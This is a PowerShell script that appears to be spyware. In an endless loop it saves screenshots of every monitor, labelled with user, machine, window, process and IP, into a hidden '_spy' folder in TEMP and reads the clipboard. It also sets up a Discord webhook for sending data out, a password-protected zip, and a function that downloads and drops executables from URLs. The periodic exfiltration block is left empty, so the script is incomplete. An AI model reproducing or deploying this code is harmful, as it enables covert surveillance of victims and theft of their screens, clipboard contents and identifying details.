$Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"
$ZipPass = "Infected2025!"  # Password-protected ZIP
$BaseDir = "$env:TEMP\$env:COMPUTERNAME`_$env:USERNAME`_spy"
$HourlyZip = "$env:TEMP\$env:COMPUTERNAME`_session_$(Get-Date -f 'yyyyMMdd').zip"
$Counter = 0

# Create spy dir
if(!(Test-Path $BaseDir)) { 
    New-Item -Path $BaseDir -ItemType Directory -Force | Out-Null 
}

$DropPaths = @()

function Get-Tool {
    param($url, $name)
    $paths = $DropPaths | Where-Object { Test-Path $_ }
    $path = ($paths | Get-Random) + "$name.exe"
    if(-not (Test-Path $path)) {
        try {
            Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction Stop
            " [+] $name.exe deployed → $path"
        } catch { " [-] Failed to download $name" }
    }
    return $path
}

while ($true) {

    $Counter++
    $time = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
    $activeWindow = (Get-Process | Where-Object {$_.MainWindowTitle} | Sort-Object CPU -Descending | Select-Object -First 1).MainWindowTitle
    $foregroundProc = (Get-Process | Where-Object {$_.Id -eq (Get-Process -Id (Get-NetTCPConnection -State Established | Where-Object {$_.OwningProcess} | Select-Object -First 1).OwningProcess)}).Name
    $clip = try { Get-Clipboard } catch { "N/A" }
    try {
        $ip = (Invoke-RestMethod -Uri "https://ifconfig.me/ip" -TimeoutSec 3 -ErrorAction SilentlyContinue)
    } catch {}

    Add-Type -AssemblyName System.Windows.Forms,System.Drawing 

    foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
        $bounds = $screen.Bounds
        try {
            $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.Width), ([int]$bounds.Height) 
            $graphics = [System.Drawing.Graphics]::FromImage($bmp) 
            $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size) 
            $overlay = "$env:USERNAME@$env:COMPUTERNAME | $time | Window: '$activeWindow' | Proc: $foregroundProc"

            if($ip) { $overlay += " | $ip" }

            $font = New-Object System.Drawing.Font("Consolas", 14, [System.Drawing.FontStyle]::Bold)
            $brush = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::Red)
            $graphics.DrawString($overlay, $font, $brush, 10, 10)
        
            $file = "$BaseDir\screen_$time`_monitor$($screen.DeviceName.Split('\')[-1]).png"
            $bmp.Save($file, [System.Drawing.Imaging.ImageFormat]::Png)
        }
        finally {
            $graphics.Dispose() 
            $bmp.Dispose() 
        }
    }

    if( $Counter % 20 -eq 0 ){ # either mod with 12(3 min interval) or 20 (5 minute interval)
        
    }
    
    Start-Sleep -Seconds 15
}